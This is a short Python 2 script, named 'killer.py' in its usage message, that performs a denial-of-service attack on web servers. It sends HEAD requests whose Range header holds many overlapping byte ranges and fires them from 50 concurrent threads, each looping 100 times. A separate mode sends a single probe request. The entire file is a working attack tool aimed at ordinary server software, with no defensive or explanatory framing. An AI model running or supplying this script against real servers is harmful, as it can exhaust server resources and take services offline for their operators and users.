# encoding:utf8
#!/usr/bin/env python
import socket
import threading
import sys

req_head = '''
HEAD / HTTP/1.1
Host: %s
Range: bytes=%s
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding:gzip,deflate,sdch
User-Agent:Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1

'''

req_get = '''
HEAD / HTTP/1.1
Host: %s
Range: bytes=%s
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding:gzip,deflate,sdch
User-Agent:Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1

'''

#fragment count and loop count
COUNT = 100
#concurrent count
PARALLEL = 50
PORT = 80

log = open('/home/stone/tmp/h.log','a')

def head(server):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, PORT))
        s.send(req_head % (server, fragment(COUNT)))
        log.write(s.recv(10240)+'\n')
        log.flush()
        s.close()
    except:
        print 'Server Seems Weak. Please Stop.'

def get(server):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, PORT))
    s.send(req_get % (server, fragment(5)))
    ret = s.recv(1024)
    s.close()
    return ret

def fragment(n):
    ret = ''
    for i in xrange(n):
        if i == 0:
            ret = ret + '0-' + str(i + 1)
        else:
            ret = ret + ',0-' + str(i + 1)
    return ret

def run(server):
    for _ in xrange(COUNT):
        head(server)

if len(sys.argv) != 3:
    print 'killer.py $server $cmd'
    sys.exit(0)

#run
srv = sys.argv[1]
cmd = sys.argv[2]
if(cmd == 'k'):
    for _ in xrange(PARALLEL):
        threading.Thread(target=run, args=(srv,)).start()
else:
    print get(srv)
